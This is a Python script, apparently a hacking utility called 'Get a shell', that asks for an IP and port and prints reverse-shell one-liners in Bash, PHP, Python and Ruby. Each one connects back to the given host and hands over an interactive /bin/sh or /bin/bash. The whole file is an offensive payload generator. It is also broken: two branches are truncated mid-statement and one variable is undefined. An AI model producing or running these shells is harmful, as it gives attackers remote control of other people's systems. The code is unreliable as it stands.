from time import sleep
import sys
import os

from rich import print

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def tittle():
    print("""[red]
╔═╗┌─┐┌┬┐  ┌─┐  ┌─┐┬ ┬┌─┐┬  ┬  
║ ╦├┤  │   ├─┤  └─┐├─┤├┤ │  │  
╚═╝└─┘ ┴   ┴ ┴  └─┘┴ ┴└─┘┴─┘┴─┘                                                
    """)

def main_menu():
    print("""[red]
                            _______________                               
                        ,==='.,            `-._                           
                            `.`---.__         `-._                       
Chosse your shell type         :.     `--.         `.                     
  ⤷ 01(Bash)                    \.        `.         `.                   
  ⤷ 02(PHP)             (,,(,    \.         `.   ____,-`.,    if you want to leave, type   
  ⤷ 03(Python)       (,'     `/   \.   ,--.___`.'                  ⤷ 666       
  ⤷ 04(Ruby)        ,'  ,--.  `,   \.;'         `                         
                   `{D, {    \  :    \;                                    
                     V,,'    /  /    //                                    
                     j;;    /  ,' ,-//.    ,---.      ,                    
                     \;'   /  ,' /  _  \  /  _  \   ,'/                    
                           \   `'  / \  `'  / \  `.' /                     
                            `.___,'   `.__,'   `.__,'  get a shell
    
    """)
    question = input("""[cyan]Enter an option
    ⤷ """)
    if question == "666":
        print(blink + "Thank you for using the script!")
        clear()
        exit()
    elif question == "1":
         clear()
         bash()
    elif question == "2":
         clear()
         php()
    elif question == "3":
         clear()
         python()
    elif question == "4":
         clear()
         ruby()

def bash():
    tittle()
    ip = input("\n[green]Enter your IP ►  ")
    port = input("[green]Enter the port ►  ")

    print("\n[yellow]Making your shell...\n")

    bash = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{bash}[/]\n")

    voltar = input("[red]Do you want to return to the main menu? (yes/no) ► ")

    if voltar == "yes":
        sleep(1)
        clear()
        main_menu()

    elif voltar == "no":
        clear()
        exit()

def php():
    clear()
    tittle()

    ip = input("[green]Enter your IP ►  ")
    port = input("[green]Enter the port ►  ")

    print("\n[yellow]Making your shell... ")

    php = shell = "php -r '$sock=fsockopen(\"{}\", {});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port)
    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{php}[/]")

    voltar = input("[red]Do you want to return to the main menu? (yes/no) ► ")

    if voltar == "yes":
        sleep(1)
        clear()
        main_menu()

    elif voltar == "no":
        clear()
        exit()

def python():
    clear()
    tittle()

    ip = input("\n[green]Enter your IP ►  ")
    port = input("[green]Enter the port ►  ")

    print("\n[yellow]Making your shell... [/]")

    python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\", {}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'".format(ip, port)
    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{python}[/]")

    voltar = input("[red]Do you want to return to the main menu? (yes/no) ► ")

    if voltar == "yes":
        sleep(1)
        clear()
        main_menu()

    elif voltar ==
        sleep(2)
        clear()
        exit()


def ruby():
    clear()
    tittle()

    ip = input("[green]Enter your IP ►  ")
    port = input("[green]Enter the port ►  ")

    print("\n[yellow]Making your shell... ")

    ruby  = "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port)
    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{ruby}[/blue]")

    voltar = input("[red] Do you want to return to the main menu? (yes/no) ► ")

    if voltar == "yes":
        sleep(1)
        clear()
        main_menu()

    elif voltar ==
        clear()
        exit()


main_menu()
bash()
php()
python()
ruby()